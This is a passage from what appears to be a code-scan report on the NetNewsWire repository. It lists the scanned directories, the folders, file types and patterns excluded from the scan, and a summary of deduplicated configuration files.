- `Mac/MainWindow/Sidebar/Renaming/`
- `Mac/MainWindow/Timeline/`
- `Mac/MainWindow/Timeline/Cell/`
- `Mac/MainWindow/Timeline/Keyboard/`
- `Mac/Preferences/`
- `Mac/Preferences/Accounts/`
- `Mac/Preferences/Advanced/`
- `Mac/Preferences/General/`
- `Mac/Resources/`
- `Mac/Resources/Assets.xcassets/AccentColor.colorset/`
- `Mac/Resources/Assets.xcassets/Account icon colors/`
- `Mac/Resources/Assets.xcassets/AppIcon.appiconset/`
- `Mac/Resources/Assets.xcassets/StarColor.colorset/`
- `Mac/Resources/Assets.xcassets/accountBazQux.imageset/`
- `Mac/Resources/Assets.xcassets/accountFeedbin.imageset/`
- `Mac/Resources/Assets.xcassets/accountFeedly.imageset/`
- `Mac/Resources/Assets.xcassets/accountLocal.imageset/`
- `Mac/Resources/Assets.xcassets/articleExtractorError.imageset/`
- `Mac/Resources/Assets.xcassets/filterInactive.imageset/`
- `Mac/Resources/Assets.xcassets/nnwFeedIcon.imageset/`
- `Mac/Resources/Assets.xcassets/preferencesToolbarExtensions.symbolset/`
- `Mac/Resources/Assets.xcassets/timelineSeparatorColor.colorset/`
- `Mac/Resources/Assets.xcassets/timelineStar.imageset/`
- `Mac/Resources/KeyboardShortcuts/`
- `Mac/SafariExtension/`
- `Mac/SafariExtension/Base.lproj/`
- `Mac/Scripting/`
- `Mac/ShareExtension/`
- `Mac/ShareExtension/Base.lproj/`
- `Modules/Account/`
- `Modules/Account/.swiftpm/xcode/xcshareddata/xcschemes/`
- `Modules/Account/Sources/Account/`
- `Modules/Account/Sources/Account/CloudKit/`
- `Modules/Account/Sources/Account/Feedbin/`
- `Modules/Account/Sources/Account/Feedly/`
- `Modules/Account/Sources/Account/LocalAccount/`
- `Modules/Account/Sources/Account/NewsBlur/`
- `Modules/Account/Sources/Account/NewsBlur/Internals/`
- `Modules/Account/Sources/Account/ReaderAPI/`
- `Modules/ActivityLog/`
- `Modules/ActivityLog/Sources/ActivityLog/`
- `Modules/ActivityLog/Sources/ActivityLog/Resources/`
- `Modules/Articles/`
- `Modules/Articles/.swiftpm/xcode/xcshareddata/xcschemes/`
- `Modules/Articles/Sources/Articles/`
- `Modules/ArticlesDatabase/`
- `Modules/ArticlesDatabase/Sources/ArticlesDatabase/`
- `Modules/ArticlesDatabase/Sources/ArticlesDatabase/Extensions/`
- `Modules/ArticlesDatabase/Sources/ArticlesDatabase/Operations/`
- `Modules/CloudKitSync/`
- `Modules/CloudKitSync/Sources/CloudKitSync/`
- `Modules/ErrorLog/`
- `Modules/ErrorLog/Sources/ErrorLog/`
- `Modules/FeedFinder/`
- `Modules/FeedFinder/Sources/FeedFinder/`
- `Modules/HTMLMetadata/`
- `Modules/HTMLMetadata/Sources/HTMLMetadata/`
- `Modules/Images/`
- `Modules/Images/Sources/Images/`
- `Modules/NewsBlur/`
- `Modules/NewsBlur/Sources/NewsBlur/`
- `Modules/NewsBlur/Sources/NewsBlur/Models/`
- `Modules/RSCore/`
- `Modules/RSCore/Sources/RSCore/`
- `Modules/RSCore/Sources/RSCore/AppKit/`
- `Modules/RSCore/Sources/RSCore/UIKit/`
- `Modules/RSCore/Sources/RSCoreObjC/`
- `Modules/RSCore/Sources/RSCoreObjC/include/`
- `Modules/RSCore/Sources/RSCoreResources/AppKit/`
- `Modules/RSCore/Sources/RSCoreResources/Resources/`
- `Modules/RSDatabase/`
- `Modules/RSDatabase/Sources/RSDatabase/`
- `Modules/RSDatabase/Sources/RSDatabaseObjC/`
- `Modules/RSDatabase/Sources/RSDatabaseObjC/include/`
- `Modules/RSParser/`
- `Modules/RSParser/Sources/RSParser/`
- `Modules/RSParser/Sources/RSParser/Feeds/`
- `Modules/RSParser/Sources/RSParser/Feeds/JSON/`
- `Modules/RSParser/Sources/RSParser/Feeds/XML/`
- `Modules/RSParser/Sources/RSParser/HTML/`
- `Modules/RSParser/Sources/RSParser/JSON/`
- `Modules/RSParser/Sources/RSParser/OPML/`
- `Modules/RSParser/Sources/RSParser/Utilities/`
- `Modules/RSParser/Sources/RSParser/XML/`
- `Modules/RSTree/`
- `Modules/RSTree/Sources/RSTree/`
- `Modules/RSWeb/`
- `Modules/RSWeb/.swiftpm/xcode/xcshareddata/xcschemes/`
- `Modules/RSWeb/Sources/RSWeb/`
- `Modules/RSWeb/Sources/RSWeb/WebServices/`
- `Modules/Secrets/`
- `Modules/Secrets/Sources/Secrets/`
- `Modules/SyncDatabase/`
- `Modules/SyncDatabase/Sources/SyncDatabase/`
- `NetNewsWire.xcodeproj/`
- `NetNewsWire.xcodeproj/project.xcworkspace/`
- `NetNewsWire.xcodeproj/project.xcworkspace/xcshareddata/`
- `NetNewsWire.xcodeproj/xcshareddata/xcschemes/`
- `Resources/Themes/Appanoose.nnwtheme/`
- `Resources/Themes/Biblioteca.nnwtheme/`
- `Resources/Themes/Hyperlegible.nnwtheme/`
- `Resources/Themes/NewsFax.nnwtheme/`
- `Resources/Themes/Promenade.nnwtheme/`
- `Resources/Themes/Sepia.nnwtheme/`
- `Resources/Themes/Tiqoe Dark.nnwtheme/`
- `Resources/Themes/Verdana Revival.nnwtheme/`
- `Shared/`
- `Shared/AccountStats/`
- `Shared/Activity/`
- `Shared/ActivityLog/`
- `Shared/Article Extractor/`
- `Shared/Article Rendering/`
- `Shared/ArticleStyles/`
- `Shared/Commands/`
- `Shared/CurrentActivity/`
- `Shared/Dinosaurs/`
- `Shared/Exporters/`
- `Shared/ExtensionPoints/`
- `Shared/Extensions/`
- `Shared/Importers/`
- `Shared/Resources/`
- `Shared/Settings/`
- `Shared/ShareExtension/`
- `Shared/SmartFeeds/`
- `Shared/Timeline/`
- `Shared/Timer/`
- `Shared/Tree/`
- `Shared/UserNotifications/`
- `Shared/Widget/`
- `Themes/Appanoose.nnwtheme/`
- `Themes/Biblioteca.nnwtheme/`
- `Themes/Hyperlegible.nnwtheme/`
- `Themes/NewsFax.nnwtheme/`
- `Themes/Promenade.nnwtheme/`
- `Themes/Sepia.nnwtheme/`
- `Themes/Tiqoe Dark.nnwtheme/`
- `Themes/Verdana Revival.nnwtheme/`
- `Widget/`
- `Widget/Assets.xcassets/`
- `Widget/Assets.xcassets/AccentColor.colorset/`
- `Widget/Assets.xcassets/AppIcon.appiconset/`
- `Widget/Assets.xcassets/CornerIcon.imageset/`
- `Widget/Resources/`
- `Widget/Shared Views/`
- `Widget/Widget Views/`
- `buildscripts/`
- `iOS/`
- `iOS/Account/`
- `iOS/AccountStats/`
- `iOS/Add/`
- `iOS/Article/`
- `iOS/Base.lproj/`
- `iOS/CurrentActivity/`
- `iOS/Inspector/`
- `iOS/IntentsExtension/`
- `iOS/MainFeed/`
- `iOS/MainFeed/Collection View Cells/`
- `iOS/MainTimeline/`
- `iOS/MainTimeline/Cell/`
- `iOS/Resources/`
- `iOS/Resources/Assets.xcassets/Account icon colors/`
- `iOS/Resources/Assets.xcassets/Account icon colors/localColor.colorset/`
- `iOS/Resources/Assets.xcassets/AppIcon.appiconset/`
- `iOS/Resources/Assets.xcassets/accountCloudKit.imageset/`
- `iOS/Resources/Assets.xcassets/accountFeedbin.imageset/`
- `iOS/Resources/Assets.xcassets/accountFeedly.imageset/`
- `iOS/Resources/Assets.xcassets/articleExtractorError.imageset/`
- `iOS/Resources/Assets.xcassets/articleExtractorOff.imageset/`
- `iOS/Resources/Assets.xcassets/articleExtractorOnSF.symbolset/`
- `iOS/Resources/Assets.xcassets/barBackgroundColor.colorset/`
- `iOS/Resources/Assets.xcassets/deleteBackgroundColor.colorset/`
- `iOS/Resources/Assets.xcassets/faviconTemplateImage.imageset/`
- `iOS/Resources/Assets.xcassets/fullScreenBackgroundColor.colorset/`
- `iOS/Resources/Assets.xcassets/nnwFeedIcon.imageset/`
- `iOS/Resources/Assets.xcassets/starColor.colorset/`
- `iOS/Resources/Assets.xcassets/vibrantTextColor.colorset/`
- `iOS/Settings/`
- `iOS/ShareExtension/`
- `iOS/ShareExtension/Base.lproj/`
- `iOS/UIKit Extensions/`
- `scripts/`
- `xcconfig/`
- `xcconfig/common/`

### Excluded from scan (535 files)

**Folders** (matched `exclude_dirs`):

- `Modules/RSParser/Tests/` — 79 files
- `.git/` — 28 files
- `Modules/Account/Tests/` — 26 files
- `Modules/RSCore/Tests/` — 22 files
- `scripts/MacCrashLogs/` — 18 files
- `Tests/` — 18 files
- `Modules/RSWeb/Tests/` — 4 files
- `Modules/NewsBlur/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/NewsBlur/Tests/` — 1 files
- `Modules/ErrorLog/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/ErrorLog/Tests/` — 1 files
- `Modules/SyncDatabase/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/Account/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/RSDatabase/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/RSDatabase/Tests/` — 1 files
- `Modules/ActivityLog/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/ActivityLog/Tests/` — 1 files
- `Modules/RSWeb/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/Articles/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/Articles/Tests/` — 1 files
- `Modules/ArticlesDatabase/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/RSParser/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/Secrets/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/Images/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/CloudKitSync/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/CloudKitSync/Tests/` — 1 files
- `Modules/HTMLMetadata/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/RSCore/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/RSTree/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/FeedFinder/.swiftpm/xcode/xcuserdata/` — 1 files
- `Modules/FeedFinder/Tests/` — 1 files
- `NetNewsWire.xcodeproj/project.xcworkspace/xcuserdata/` — 1 files
- `NetNewsWire.xcodeproj/xcuserdata/` — 1 files

**File types** (matched `exclude_exts`):

- `*.png` — 79 files
- `*.pdf` — 47 files
- `*.svg` — 8 files
- `*.enc` — 5 files
- `*.xctestplan` — 3 files
- `*.cer` — 1 files
- `*.icns` — 1 files
- `*.provisionprofile` — 1 files
- `*.installerlauncher` — 1 files
- `*.nib` — 1 files
- `*.installerconnection` — 1 files
- `*.installerstatus` — 1 files
- `*.downloader` — 1 files
- `*.resolved` — 1 files

**Patterns** (matched `exclude_globs`):

- `Mac/Resources/org.sparkle-project.InstallerLauncher.xpc/**` — 37 files
- `Technotes/**` — 23 files
- `**/.gitignore` — 14 files
- `AppleScript/**` — 5 files
- `Appcasts/**` — 3 files
- `Mac/Resources/org.sparkle-project.InstallerConnection.xpc/**` — 2 files
- `Mac/Resources/org.sparkle-project.InstallerStatus.xpc/**` — 2 files
- `Mac/Resources/org.sparkle-project.Downloader.xpc/**` — 2 files
- `**/.DS_Store` — 1 files
- `**/LICENSE` — 1 files
- `**/.editorconfig` — 1 files
- `**/CODEOWNERS` — 1 files
- `AppStore/**` — 1 files
- `Widget/Resources/widget-sample.json` — 1 files

**Config dedup**: 106 config files -> 9 shape-clusters; kept 19 representatives + 0 promoted (suspicious value), dropped 69 near-duplicates.

- `Widget/Assets.xcassets/AccentColor.colorset/Contents.json` x26 (kept 3, dropped 23)
- `Mac/Resources/Assets.xcassets/nnwFeedIcon.imageset/Contents.json` x11 (kept 2, dropped 9)
- `Mac/Resources/Assets.xcassets/accountFeedbin.imageset/Contents.json` x9 (kept 2, dropped 7)
- `Mac/Resources/Assets.xcassets/filterInactive.imageset/Contents.json` x8 (kept 1, dropped 7)
- `Mac/Resources/Assets.xcassets/articleExtractorError.imageset/Contents.json` x8 (kept 2, dropped 6)
- `Mac/Resources/Assets.xcassets/preferencesToolbarExtensions.symbolset/Contents.json` x8 (kept 2, dropped 6)
- `Mac/Resources/Assets.xcassets/StarColor.colorset/Contents.json` x7 (kept 2, dropped 5)
- `Mac/Resources/Assets.xcassets/Account icon colors/Contents.json` x6 (kept 3, dropped 3)
- `iOS/Resources/Assets.xcassets/articleExtractorOff.imageset/Contents.json` x5 (kept 2, dropped 3)
